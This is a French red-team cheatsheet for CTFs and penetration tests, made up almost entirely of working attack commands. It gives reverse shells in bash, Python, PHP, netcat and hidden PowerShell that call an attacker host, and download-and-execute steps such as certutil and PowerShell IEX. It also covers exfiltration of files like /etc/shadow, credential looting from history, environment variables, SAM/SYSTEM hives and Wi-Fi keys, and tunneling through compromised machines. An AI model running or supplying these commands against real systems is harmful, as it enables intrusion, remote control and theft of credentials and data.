---
tags:
  - hacking
  - cheatsheet
  - red-team
  - reverse-shell
  - pentest
---

# Red Team Cheatsheet

Le mémento de survie pour les CTF et Pentests. Les commandes qu'on oublie toujours au pire moment.

---

## 1. Reverse Shells

Comment connecter la victime (RHOST) à votre machine attaquante (LHOST:LPORT).
*   **LHOST** : Votre IP (Attaquant).
*   **LPORT** : Votre port d'écoute (ex: 4444).

**Sur votre machine (Listener) :**
```bash
nc -lvnp 4444
```

### Bash
```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP (Web Shell)
```php
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat (Si version -e supportée)
```bash
nc -e /bin/sh LHOST LPORT
```
*Si pas de -e (OpenBSD netcat) :*
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
```

### PowerShell (Windows)
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

---

## 2. Stabilisation de Shell (TTY Upgrade)

Vous avez un shell, mais `CTRL+C` tue votre connexion et `vim` ne marche pas ? Il faut l'upgrade.

**Dans le shell victime :**
1.  Lancer un pseudo-terminal Python :
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
2.  Mettre en pause (`CTRL+Z`).

**Sur votre machine (Kali) :**
3.  Configurer le terminal local :
    ```bash
    stty raw -echo; fg
    ```
4.  (De retour dans le shell victime) : `reset`
5.  Définir le type de terminal :
    ```bash
    export TERM=xterm-256color
    export SHELL=bash
    ```

---

## 3. Transfert de Fichiers

Comment uploader `linpeas.sh` ou exfiltrer `shadow` ?

### Serveur HTTP (Le classique)
**Attaquant :**
```bash
python3 -m http.server 80
```
**Victime :**
```bash
wget http://LHOST/file
curl http://LHOST/file -o file
```

### Netcat (Si pas de wget/curl)
**Receveur (Attaquant) :** `nc -lvnp 4444 > outfile`
**Envoyeur (Victime) :** `nc -w 3 LHOST 4444 < infile`

### Windows (Certutil)
Natif sur Windows, bypass souvent les restrictions.
```powershell
certutil.exe -urlcache -split -f "http://LHOST/file.exe" file.exe
```

### PowerShell Download
```powershell
IEX(New-Object Net.WebClient).downloadString('http://LHOST/script.ps1')
```

### SMB (Impacket)
**Attaquant :**
```bash
sudo impacket-smbserver share . -smb2support
```
**Victime (Windows) :**
```powershell
copy \\LHOST\share\file.exe .
```

---

## 4. Looting (Trouver les Mots de Passe)

### Linux
*   `history`, `cat ~/.bash_history`
*   `env` (Chercher des clés API)
*   `/var/www/html/config.php` (Mots de passe BDD)
*   `cat /etc/shadow` (Si root)

### Windows
*   **Registre (AutoLogon)** :
    ```powershell
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    ```
*   **SAM & SYSTEM** (Pour dumper les hashs offline) :
    ```powershell
    reg save HKLM\SAM sam.save
    reg save HKLM\SYSTEM system.save
    ```
*   **Wifi Passwords** :
    ```powershell
netsh wlan show profile name="SSID" key=clear
    ```

---

## 5. Tunneling (Pivoting)

Accéder à un port interne via la machine compromise.

### SSH Local Port Forwarding
"Je veux accéder au port 3306 de la victime sur mon port 3306."
```bash
ssh -L 3306:127.0.0.1:3306 user@target
```

### Chisel (Le top du tunnel SOCKS)
**Serveur (Attaquant) :**
```bash
./chisel server -p 8000 --reverse
```
**Client (Victime) :**
```bash
./chisel client LHOST:8000 R:socks
```
*Puis configurer `/etc/proxychains.conf` sur 1080.*